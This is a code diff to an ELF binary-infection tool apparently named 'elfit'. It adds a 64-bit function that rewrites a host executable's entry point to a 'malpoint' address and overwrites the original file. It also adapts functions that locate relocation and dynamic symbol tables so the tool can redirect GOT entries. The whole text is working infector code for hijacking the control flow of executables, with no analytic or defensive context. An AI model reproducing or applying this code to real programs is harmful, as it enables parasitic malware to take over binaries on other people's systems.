@@ -1,6 +1,6 @@
 #include "elfit.h"
 
-int entry_redirect(Elfit_t *host, unsigned long malpoint)
+int entry_redirect_32(Elfit_t *host, unsigned long malpoint)
 {
     int ofd, c;
     Elf32_Ehdr *ehdr;
@@ -28,7 +28,35 @@ int entry_redirect(Elfit_t *host, unsigned long malpoint)
     return 1;
 }
 
-Elf32_Addr got_redirect(Elfit_t *host, char *target, unsigned long malpoint)
+int entry_redirect_64(Elfit_t *host, unsigned long malpoint)
+{
+    int ofd, c;
+    Elf64_Ehdr *ehdr;
+    
+    printf("Patching host's entrypoint to 0x%x\n", malpoint);
+
+    ehdr = (Elf64_Ehdr *) host->mem;
+
+    ehdr->e_entry = malpoint;
+
+    if ((ofd = open(TMP, O_CREAT | O_WRONLY | O_TRUNC, host->file->st_mode))
+        < 0)
+    {
+        perror("tmp binary: open");
+        return -1; 
+    }
+
+    if ((c = write(ofd, host->mem, host->file->st_size)) != host->file->st_size)
+    {
+        perror("tmp binary: write");
+        return -1;
+    }
+
+    rename(TMP, host->name);
+    return 1;
+}
+
+Elf32_Addr got_redirect_32(Elfit_t *host, char *target, unsigned long malpoint)
 {
     Elf32_Ehdr *ehdr;
     Elf32_Shdr *shdr;
@@ -45,21 +73,21 @@ Elf32_Addr got_redirect(Elfit_t *host, char *target, unsigned long malpoint)
     phdr = (Elf32_Phdr *) (host->mem + ehdr->e_phoff); 
     shdr = (Elf32_Shdr *) (host->mem + ehdr->e_shoff);
 
-    if ((relindex = get_section_by_name(".rel.plt", host)) == -1)
+    if ((relindex = get_section_by_name_32(".rel.plt", host)) == -1)
     {
         printf("could not find relocation table\n");
         return -1;
     }
     rel = (Elf32_Rel *) (host->mem + shdr[relindex].sh_offset);
 
-    if ((dynsymindex = get_section_by_name(".dynsym", host)) == -1)
+    if ((dynsymindex = get_section_by_name_32(".dynsym", host)) == -1)
     {
         printf("could not find dynamic symbol table\n");
         return -1;
     }
     dynsym = (Elf32_Sym *) (host->mem + shdr[dynsymindex].sh_offset);
 
-    if ((dynstrindex = get_section_by_name(".dynstr", host)) == -1)
+    if ((dynstrindex = get_section_by_name_32(".dynstr", host)) == -1)
     {
         printf("could not find dynamic string table\n");
         return -1;
